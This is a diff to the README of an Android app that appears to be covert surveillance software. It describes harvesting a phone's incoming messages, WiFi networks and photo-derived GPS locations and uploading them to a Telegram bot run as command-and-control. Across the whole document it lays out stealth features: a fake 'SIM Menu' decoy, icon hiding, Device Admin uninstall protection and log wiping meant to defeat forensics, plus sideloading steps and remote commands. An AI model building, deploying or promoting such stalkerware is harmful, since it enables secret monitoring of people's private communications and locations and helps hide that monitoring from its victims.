@@ -9,42 +9,40 @@ It leverages Android's **NotificationListenerService** to capture telemetry (mes
 ### Architecture
 The application is built as a **Headless Android Application** with a focus on stealth and persistence.
 
-### Implementation Status
-- [x] **Phase 1: Core Telemetry** (Service, Local DB).
-- [x] **Phase 2: Persistence & Stealth** (Hidden icon - SIM Menu, Boot Receiver).
-- [x] **Phase 3: C2 Infrastructure** (Telegram Bot, Command Processor).
-- [x] **Phase 4: Stealth & Privacy** (WorkManager Polling, Secure Deletion, App Hiding).
+
 
 ### Core Components
 *   **Telemetry Engine**: `SentinelNotificationListener` capturing incoming messages and alerts independently of UI.
+*   **Intelligence Engine**: Passive Monitoring (WiFi/Location) triggered by `C2Worker` cycles.
 *   **C2 Interface**: `C2Worker` (WorkManager) operating on a 15-minute periodic cycle for silent uploads and command polling.
-*   **Stealth Engine**: `StealthManager` for programmatic icon hiding/showing and `SecureDelete` for forensic-grade log cleanup.
-*   **Security Core**: Encrypted Preferences for credentials (AES-256).
+*   **Stealth Engine**: `SIMMenuActivity` (Decoy UI), `StealthManager` (Icon Hiding), and `SecureDelete` (Forensics).
+*   **Security Core**: Encrypted Preferences (AES-256) and `SentinelDeviceAdminReceiver` (Uninstall Protection).
 
 ## Key Features
-1.  **True Stealth**: No persistent notification. App icon can be hidden remotely via Telegram command `/hide`.
-2.  **Resilience**: Uses `WorkManager` for guaranteed background execution even on restricted battery modes.
-3.  **Data Hygiene**: Logs are securely wiped (overwritten with zeros) immediately after successful upload.
-4.  **Serverless**: Uses Telegram as the C2 infrastructure, removing the need for VPS maintenance.
-5.  **App Lock**: UI is protected by a password (AES-256 encrypted) to prevent unauthorized access.
-6.  **In-App Updater**: Checks for updates from GitHub Releases and installs them securely.
+1.  **Stealth Decoy**: App disguised as "SIM Menu" with a fake UI. Access real app via secret PIN.
+2.  **Passive Monitoring**: Silently logs WiFi SSID and GPS Location (from photos) every 15 minutes.
+3.  **Resilience**: Uses `WorkManager` for guaranteed background execution and **Device Admin** to prevent uninstallation.
+4.  **Data Hygiene**: Logs are securely wiped (overwritten with zeros) immediately after successful upload.
+5.  **Serverless**: Uses Telegram as the C2 infrastructure, removing the need for VPS maintenance.
+6.  **Secure Access**: Remote PIN management and local App Lock (AES-256) to prevent unauthorized access.
 
 ## Commands
 Control the agent via your Telegram Bot:
 *   `/ping`: Check status. Returns next scheduled wake-up time.
 *   `/wipe`: Force delete all local logs and database records.
-*   `/hide`: Hide the application icon from the launcher.
-*   `/show`: Restore the application icon.
+*   `/setpin <PIN>`: Remotely change the app access PIN.
 
 ## Installation (Side-Loading)
 This application is **NOT** available on the Play Store due to its use of high-privilege APIs.
 1.  Download the latest APK from Releases.
-2.  Install and follow the "Onboarding Wizard" to grant permissions.
+2.  Install and open **"SIM Menu"**.
+3.  Click **"Help and Support"** and enter default PIN **`123123`**.
+4.  Follow the "Onboarding Wizard" to grant permissions:
     *   **Notification Access**: Required for telemetry.
     *   **Ignore Battery Opts**: Required for background persistence.
-3.  Enter your Telegram Bot Token and Chat ID.
-4.  **Set App Password**: Secure the app interface with a password.
-5.  (Optional) Send `/hide` to vanish from the launcher.
+    *   **Uninstall Protection**: Enable Device Admin to prevent removal.
+5.  Enter your Telegram Bot Token and Chat ID.
+6.  **Set App Password**: Change the default PIN immediately.
 
 ## Build Instructions
 1.  **Prerequisites**: JDK 21, Android SDK API 34.
